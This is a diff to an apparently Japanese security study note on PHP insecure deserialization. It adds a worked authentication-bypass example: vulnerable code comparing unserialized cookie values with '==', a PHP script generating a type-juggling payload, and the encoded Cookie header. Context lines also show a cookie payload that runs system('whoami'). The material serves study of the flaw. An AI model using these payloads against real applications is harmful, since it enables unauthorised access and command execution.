@@ -88,6 +88,32 @@ GETのデータとかCookieのデータとかで`system("whoami")`を実行す�
 Cookie: r=O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D
 ```
 ## AuthBypass TypeJuggling
+```php
+// 一見、どう見ても安全に見えるが実はがちがちに脆弱。ヤバすぎてワロタ
+data = unserialize($_COOKIE['auth']);
+
+// "=="で比較しているため、TypeJugglingにより、 true(boolean) == "admin"(string) はTrueとなるので危険！
+if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
+    $admin = true;
+} else {
+    $admin = false;
+}
+```
+以下でAuthBypassのためのPayloadを作成。   
+```php
+<?php
+$data = array("username" => true, "password" => true);
+echo serialize($data)."\n"; // a:2:{s:8:"username";b:1;s:8:"password";b:1;}
+
+// "username"のValueの値をBooleanのTrueにするとTypeJugglingによりAuthBypassできる！
+echo gettype(true == "admin")." : ".(true == "admin")."\n";  // boolean : 1
+echo gettype(true === "admin")." : ".(true === "admin")."\n"; // boolean : 
+?>
+```
+作成した`a:2:{s:8:"username";b:1;s:8:"password";b:1;}`をURL encodeしてCookieにセットすればBypassできる！   
+```txt
+Cookie: auth=a%3A2%3A%7Bs%3A8%3A%22username%22%3Bb%3A1%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D
+```
 ## AuthBypass ObjectReference
 ## POP chain (SQL Injection)
 # 参考
